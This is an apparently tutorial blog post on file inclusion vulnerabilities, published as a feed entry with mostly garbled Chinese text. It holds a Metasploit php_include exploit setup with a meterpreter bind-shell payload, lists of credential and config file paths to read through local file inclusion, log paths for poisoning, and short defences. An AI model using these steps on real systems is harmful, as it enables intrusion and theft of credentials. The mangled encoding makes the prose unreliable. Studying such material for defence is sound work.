&lt;img data-src=&#34;image017.png&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
è¿™æ˜¯å› ä¸º Apache é…ç½®&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;image016.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;è¯¦æƒ…è§ï¼š&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zZWxmLWZlcnJ5LmdpdGh1Yi5pby8yMDIxLzAxLzIyL2FwYWNoZSVFOCVBRSVCRiVFOSU5NyVBRSVFNiU5NyVBNSVFNSVCRiU5NyVFOCVBRiVBNiVFOCVBNyVBMyVFMyU4MCU5MCVFOCVCRCVBQyVFMyU4MCU5MS8=&#34;&gt;https://self-ferry.github.io/2021/01/22/apache è®¿é—®æ—¥å¿—è¯¦è§£ã€è½¬ã€‘/&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;msf-æ”»å‡»æ¨¡å—&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#msf-æ”»å‡»æ¨¡å—&#34;&gt;#&lt;/a&gt; MSF æ”»å‡»æ¨¡å—&lt;/h2&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;span&gt;ä¸¾ä¸ªä¾‹å­&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;use exploit/unix/webapp/php_include&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; rhost &lt;span class=&#34;token number&#34;&gt;192.168&lt;/span&gt;.199.12&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; rport &lt;span class=&#34;token number&#34;&gt;80&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; phpuri /index.php?file&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;xxLFIxx&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; path http://192.168.199.147/&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; payload php/meterpreter/bind_tcp&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; srvport &lt;span class=&#34;token number&#34;&gt;8888&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;exploit -z&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h1 id=&#34;å¸¸è§çš„æ•æ„Ÿä¿¡æ¯è·¯å¾„&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#å¸¸è§çš„æ•æ„Ÿä¿¡æ¯è·¯å¾„&#34;&gt;#&lt;/a&gt; å¸¸è§çš„æ•æ„Ÿä¿¡æ¯è·¯å¾„&lt;/h1&gt;
&lt;h2 id=&#34;windowsç³»ç»Ÿ&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#windowsç³»ç»Ÿ&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;label info&#34;&gt;Windows ç³»ç»Ÿ&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;c:\boot.ini// æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬&lt;/p&gt;
&lt;p&gt;c:\windows\system32\inetsrv\MetaBase.xml// IIS é…ç½®æ–‡ä»¶&lt;/p&gt;
&lt;p&gt;c:\windows\repair\sam // å­˜å‚¨ Windows ç³»ç»Ÿåˆæ¬¡å®‰è£…çš„å¯†ç &lt;/p&gt;
&lt;p&gt;c:\ProgramFiles\mysql\my.ini// MySQL é…ç½®&lt;/p&gt;
&lt;p&gt;c:\ProgramFiles\mysql\data\mysql\user.MYD// MySQL root å¯†ç &lt;/p&gt;
&lt;p&gt;c:\windows\php.ini//php é…ç½®ä¿¡æ¯&lt;/p&gt;
&lt;h2 id=&#34;linuxunixç³»ç»Ÿ&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#linuxunixç³»ç»Ÿ&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;label info&#34;&gt;Linux/Unix ç³»ç»Ÿ&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;/etc/passwd// è´¦æˆ·ä¿¡æ¯&lt;/p&gt;
&lt;p&gt;/etc/shadow// è´¦æˆ·å¯†ç æ–‡ä»¶&lt;/p&gt;
&lt;p&gt;/usr/local/app/apache2/conf/httpd.conf// Apache2 é»˜è®¤é…ç½®æ–‡ä»¶&lt;/p&gt;
&lt;p&gt;/usr/local/app/apache2/conf/extra/httpd-vhost.conf// è™šæ‹Ÿç½‘ç«™é…ç½®&lt;/p&gt;
&lt;p&gt;/usr/local/app/php5/lib/php.ini// PHP ç›¸å…³é…ç½®&lt;/p&gt;
&lt;p&gt;/etc/httpd/conf/httpd.conf// Apache é…ç½®æ–‡ä»¶&lt;/p&gt;
&lt;p&gt;/etc/my.conf//mysql é…ç½®æ–‡ä»¶&lt;/p&gt;
&lt;h2 id=&#34;æ—¥å¿—é»˜è®¤è·¯å¾„&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#æ—¥å¿—é»˜è®¤è·¯å¾„&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;label info&#34;&gt;æ—¥å¿—é»˜è®¤è·¯å¾„&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;apache+Linux æ—¥å¿—é»˜è®¤è·¯å¾„&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/etc/httpd/logs/access_log&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;æˆ–è€…&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/var/log/httpd/access log&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;apache+win2003 æ—¥å¿—é»˜è®¤è·¯å¾„&lt;/p&gt;
&lt;p&gt;&lt;code&gt;D:/xampp/apache/logs/access.log&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;D:/xampp/apache/logs/error.log&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;IIS6.0+win2003 é»˜è®¤æ—¥å¿—æ–‡ä»¶&lt;/p&gt;
&lt;p&gt;&lt;code&gt;C:/WINDOWS/system32/Logfiles&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;IIS7.0+win2003 é»˜è®¤æ—¥å¿—æ–‡ä»¶&lt;/p&gt;
&lt;p&gt;&lt;code&gt;%SystemDrive%/inetpub/logs/LogFiles&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;nginx æ—¥å¿—æ–‡ä»¶åœ¨ç”¨æˆ·å®‰è£…ç›®å½•çš„ logs ç›®å½•ä¸‹&lt;/p&gt;
&lt;p&gt;å¦‚å®‰è£…ç›®å½•ä¸º /usr/local/nginx, åˆ™æ—¥å¿—ç›®å½•å°±æ˜¯åœ¨&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/usr/local/nginx/logs&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;ä¹Ÿå¯é€šè¿‡å…¶é…ç½®æ–‡ä»¶ Nginx.confï¼Œè·å–åˆ°æ—¥å¿—çš„å­˜åœ¨è·¯å¾„&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/opt/nginx/logs/access.log&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;web ä¸­é—´ä»¶é»˜è®¤é…ç½®&lt;/p&gt;
&lt;p&gt;apache+linux é»˜è®¤é…ç½®æ–‡ä»¶&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/etc/httpd/conf/httpd.conf&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;æˆ–è€…&lt;/p&gt;
&lt;p&gt;&lt;code&gt;index.php?page=/etc/init.d/httpd&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;IIS6.0+win2003 é…ç½®æ–‡ä»¶&lt;/p&gt;
&lt;p&gt;&lt;code&gt;C:/Windows/system32/inetsrv/metabase.xml&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;IIS7.0+WIN é…ç½®æ–‡ä»¶&lt;/p&gt;
&lt;p&gt;&lt;code&gt;C:/Windows/System32/inetsrv/config/application/Host.config&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;æ–‡ä»¶åŒ…å«æ¼æ´çš„é˜²å¾¡&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#æ–‡ä»¶åŒ…å«æ¼æ´çš„é˜²å¾¡&#34;&gt;#&lt;/a&gt; æ–‡ä»¶åŒ…å«æ¼æ´çš„é˜²å¾¡&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;PHP ä¸­ä½¿ç”¨ open_basedir é…ç½®é™åˆ¶è®¿é—®åœ¨æŒ‡å®šçš„åŒºåŸŸ&lt;/li&gt;
&lt;li&gt;è¿‡æ»¤.ï¼ˆç‚¹ï¼‰/ï¼ˆåæ–œæ ï¼‰\ï¼ˆåæ–œæ ï¼‰&lt;/li&gt;
&lt;li&gt;ç¦æ­¢æœåŠ¡å™¨è¿œç¨‹æ–‡ä»¶åŒ…å«&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;å‚è€ƒ&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#å‚è€ƒ&#34;&gt;#&lt;/a&gt; å‚è€ƒ&lt;/h1&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzE4MjI4MC5odG1s&#34;&gt;https://www.freebuf.com/articles/web/182280.html&lt;/span&gt;&lt;br /&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cucGhwLmNuL3RvdXRpYW8tNDE0NzkwLmh0bWw=&#34;&gt;https://www.php.cn/toutiao-414790.html&lt;/span&gt;&lt;br /&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25pOWh0bWFyMy9hcnRpY2xlL2RldGFpbHMvNjk4MTIzMDY=&#34;&gt;https://blog.csdn.net/ni9htmar3/article/details/69812306&lt;/span&gt;&lt;/p&gt;
</content>
        <category term="æ–‡ä»¶åŒ…å«" />
        <updated>2021-01-20T04:12:47.000Z</updated>
    </entry>
</feed>
